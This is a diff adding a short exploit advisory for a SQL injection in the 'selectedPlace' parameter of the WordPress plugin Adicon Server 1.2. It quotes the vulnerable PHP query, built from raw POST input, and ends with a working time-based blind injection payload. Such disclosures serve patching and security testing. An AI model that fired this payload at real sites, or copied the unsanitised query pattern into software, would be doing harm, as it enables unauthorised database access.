@@ -1,0 +1,18 @@
+# Exploit Title: WordPress Plugin Adicon Server 1.2 - 'selectedPlace' SQL Injection
+# Date: 2018-12-28
+# Software Link: https://wordpress.org/plugins/adicons/
+# Exploit Author: Kaimi
+# Website: https://kaimi.io
+# Version: 1.2
+# Category: webapps
+
+# SQL Injection
+# File: addIcon.php
+# Vulnerable code:
+# $placement=$_POST['selectedPlace'];
+
+# $x=explode("_",$placement);
+# $ck=$wpdb->get_row("select id from ".$table_prefix."adicons where adRow=".$x[0]." and adCol=".$x[1]);
+
+# Example payload:
+selectedPlace=1 AND (SELECT * FROM (SELECT(SLEEP(1)))abcD); -- -
